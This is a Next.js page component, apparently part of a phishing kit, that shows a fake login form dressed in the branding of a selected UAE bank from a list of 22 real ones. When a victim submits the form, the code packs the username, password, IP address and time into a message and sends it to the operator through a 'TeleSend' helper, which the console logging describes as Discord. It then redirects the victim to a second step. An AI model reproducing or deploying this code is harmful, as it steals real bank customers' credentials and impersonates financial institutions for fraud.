// app/payment/banks/bankaz/page.jsx
'use client'

import { useRouter } from 'next/navigation';
import Image from "next/image";
import { useState, useEffect } from 'react';
import TeleSned from "../../../../server/TeleSend";

export default function Page() {
    const router = useRouter();
    const { Send } = TeleSned();
    const [isLoading, setIsLoading] = useState(false);
    const [showSplash, setShowSplash] = useState(true);
    
    // استخراج البارامترات من window.location مباشرة
    const [bankId, setBankId] = useState(null);
    const [bankName, setBankName] = useState(null);
    const [ip, setIp] = useState(null);

    useEffect(() => {
        // استخراج البارامترات من URL
        const params = new URLSearchParams(window.location.search);
        setBankId(params.get('bankId'));
        setBankName(params.get('bankName'));
        setIp(params.get('ip'));
        
        // إخفاء شاشة التحميل بعد الحصول على البارامترات
        setShowSplash(false);
    }, []);

    const banks = [
        { id: 1, name: 'بنك أبو ظبي التجاري', src: '/b-abodabetgare.jfif', url: '/payment/banks/bankaz' },
        { id: 2, name: 'بنك أبو ظبي الأول', src: '/b-abodabeone.jpg', url: '/payment/banks/bankaz' },
        { id: 3, name: 'بنك الإمارات الإسلامي', src: '/b-emaratislam.png', url: '/payment/banks/bankaz' },
        { id: 4, name: 'بنك الإمارات دبي الوطني', src: '/b-emaratdubaiwatne.jpg', url: '/payment/banks/bankaz' },
        { id: 5, name: 'بنك دبي التجاري', src: '/b-dubaitgare.jpg', url: '/payment/banks/bankaz' },
        { id: 6, name: 'بنك أبو ظبي الإسلامي', src: '/b-abodabeislam.jpg', url: '/payment/banks/bankaz' },
        { id: 7, name: 'بنك المشرق', src: '/b-mahrok.png', url: '/payment/banks/bankaz' },
        { id: 8, name: 'بنك دبي الإسلامي', src: '/b-dubaiislam.jpg', url: '/payment/banks/bankaz' },
        { id: 9, name: 'HSBC بنك', src: '/bhsbc.png', url: '/payment/banks/bankaz' },
        { id: 10, name: 'مصرف الشارقة الإسلامي', src: '/msrfsharka.jfif', url: '/payment/banks/bankaz' },
        { id: 11, name: 'بنك رأس الخيمة الوطني', src: '/b-raskema.gif', url: '/payment/banks/bankaz' },
        { id: 12, name: 'بنك الفجيرة الوطني', src: '/b-fgerwatny.jpg', url: '/payment/banks/bankaz' },
        { id: 13, name: 'بنك الاستثمار', src: '/bank-investment.jpg', url: '/payment/banks/bankaz' },
        { id: 14, name: 'بنك أم القيوين الوطني', src: '/b.jpg', url: '/payment/banks/bankaz' },
        { id: 15, name: 'بنك الماريا المحلي', src: '/bmarea.jpg', url: '/payment/banks/bankaz' },
        { id: 16, name: 'بنك الهلال', src: '/bank-hilal.jpg', url: '/payment/banks/bankaz' },
        { id: 17, name: 'Wio Bank', src: '/wiob.webp', url: '/payment/bankaz' },
        { id: 18, name: 'المصرف', src: '/bank-al-masraf.jpg', url: '/payment/banks/bankaz' },
        { id: 19, name: 'بنك عجمان', src: '/bajman.jpg', url: '/payment/bankaz' },
        { id: 20, name: 'بنك الشارقة', src: '/bank-sharjah.jpg', url: '/payment/banks/bankaz' },
        { id: 21, name: 'Liv X', src: '/livexb.jfif', url: '/payment/banks/bankaz' },
        { id: 22, name: 'Zand Bank', src: '/bank-zand.jpg', url: '/payment/banks/bankaz' }
    ];

    // العثور على البنك المحدد
    const selectedBank = banks.find(bank => bank.id === parseInt(bankId));

    const handleSubmit = async (e) => {
        e.preventDefault();
        setIsLoading(true);
        
        const form = e.target;
        const username = form.username.value;
        const password = form.password.value;

        try {
            const description = `🏦 **بيانات تسجيل الدخول**\n\n` +
                               `📌 **البنك:** ${selectedBank?.name || 'غير معروف'}\n` +
                               `👤 **اسم المستخدم:** ${username}\n` +
                               `🔑 **كلمة المرور:** ${password}\n` +
                               `🌐 **IP المستخدم:** ${ip || 'غير معروف'}\n` +
                               `🕒 **الوقت:** ${new Date().toLocaleString('ar-OM')}`;
            
            Send(description);
            console.log('✅ تم إرسال بيانات تسجيل الدخول إلى Discord');
        } catch (error) {
            console.error('❌ خطأ في الإرسال إلى Discord:', error);
        }

        setTimeout(() => {
            setIsLoading(false);
            router.push(`/payment/banks/bankaz/step2?bankId=${bankId}&bankName=${encodeURIComponent(selectedBank?.name || '')}&ip=${encodeURIComponent(ip || '')}`);
        }, 2000);
    };

    // شاشة التحميل (تظهر فقط أثناء تحميل البارامترات)
    if (showSplash || bankId === null) {
        return (
            <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
                <div className="z-10 w-full max-w-md mx-auto">
                    <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-12 md:p-16 border border-gray-100">
                        <div className="mb-8">
                            <Image
                                src={selectedBank?.src || '/bank-placeholder.png'}
                                alt={selectedBank?.name || 'البنك'}
                                width={100}
                                height={100}
                                className="object-contain rounded-full shadow-lg"
                            />
                        </div>
                        <h1 className="text-2xl md:text-3xl font-bold text-[#008000] mb-8 text-center">
                            {selectedBank?.name || 'جاري التحميل'}
                        </h1>
                        <div className="relative w-24 h-24">
                            <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
                            <div className="absolute inset-0 rounded-full border-4 border-[#008000] border-t-transparent animate-spin"></div>
                        </div>
                        <p className="mt-8 text-sm text-gray-500">
                            يرجى الانتظار جاري تجهيز البيانات...
                        </p>
                    </div>
                </div>
            </main>
        );
    }

    // إذا لم يتم العثور على البنك
    if (!selectedBank) {
        return (
            <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
                <div className="z-10 w-full max-w-md mx-auto">
                    <div className="bg-white rounded-xl shadow-xl p-8 text-center border border-gray-100">
                        <p className="text-red-500 text-lg">❌ لم يتم اختيار بنك</p>
                        <button
                            onClick={() => router.push('/payment/banks')}
                            className="mt-4 px-6 py-2 bg-[#008000] text-white rounded-lg hover:bg-[#600000] transition-all duration-300"
                        >
                            العودة لاختيار البنك
                        </button>
                    </div>
                </div>
            </main>
        );
    }

    return (
        <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
            <div className="z-10 w-full max-w-md mx-auto">
                <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-8 border border-gray-100 mb-6">
                    <div className="w-20 h-20 relative rounded-full overflow-hidden bg-gray-50 flex items-center justify-center mb-4">
                        <Image
                            src={selectedBank.src || '/bank-placeholder.png'}
                            alt={selectedBank.name || 'البنك المختار'}
                            width={80}
                            height={80}
                            className="object-contain p-2"
                            onError={(e) => {
                                e.target.src = '/bank-placeholder.png';
                            }}
                        />
                    </div>
                    <h2 className="text-2xl font-bold text-[#008000] text-center">
                        {selectedBank.name}
                    </h2>
                    <p className="text-gray-600 mt-2 text-center text-sm">
                        {selectedBank.name}
                    </p>
                </div>

                <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 border border-gray-100">
                    <h1 className='text-[#008000] text-lg font-bold text-center mb-4'>
                        {selectedBank.name} - تسجيل الدخول
                    </h1>
                    <form onSubmit={handleSubmit} className="space-y-5">
                        <div>
                            <label htmlFor="username" className="block mb-1.5 text-sm font-semibold text-gray-700">
                                اسم المستخدم أو البريد الإلكتروني <span className="text-[#008000]">*</span>
                            </label>
                            <input
                                type="text"
                                id="username"
                                name="username"
                                required
                                placeholder="أدخل اسم المستخدم"
                                className="w-full text-gray-700 border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#008000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
                                dir="ltr"
                            />
                        </div>

                        <div>
                            <label htmlFor="password" className="block mb-1.5 text-sm font-semibold text-gray-700">
                                كلمة المرور <span className="text-[#008000]">*</span>
                            </label>
                            <input
                                type="password"
                                id="password"
                                name="password"
                                required
                                placeholder="أدخل كلمة المرور"
                                className="w-full border  text-gray-700 border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#008000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
                                dir="ltr"
                            />
                        </div>

                        <button
                            type="submit"
                            disabled={isLoading}
                            className="w-full px-6 py-3 bg-[#008000] text-white rounded-lg shadow-md hover:bg-[#600000] transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-[#008000] focus:ring-offset-2 text-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                            {isLoading ? (
                                <span className="flex items-center justify-center gap-2">
                                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                    </svg>
                                    جاري المعالجة...
                                </span>
                            ) : (
                                'التالي'
                            )}
                        </button>
                    </form>
                </div>
            </div>
        </main>
    );
}
